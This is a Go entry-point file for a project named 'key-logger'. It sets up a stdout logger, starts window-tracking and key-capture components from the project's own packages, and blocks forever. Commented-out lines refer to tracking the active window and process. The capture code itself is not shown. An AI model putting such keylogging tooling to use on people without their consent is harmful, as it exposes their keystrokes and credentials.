package main

import (
	"os"

	gklog "github.com/go-kit/kit/log"

	"key-logger/pkg/key"
	"key-logger/pkg/window"
)

func main() {

	logger := gklog.NewLogfmtLogger(gklog.NewSyncWriter(os.Stdout))

	w := window.New(logger)
	_ = key.New(logger, w)

	for {
		select {}
	}

	//go getActiveWindowInfo(winChan, processChan)
	//
	//
	//
	//go cb.updateActiveWindow(winChan, processChan)
	//go getLastInputInfoLoop()

}
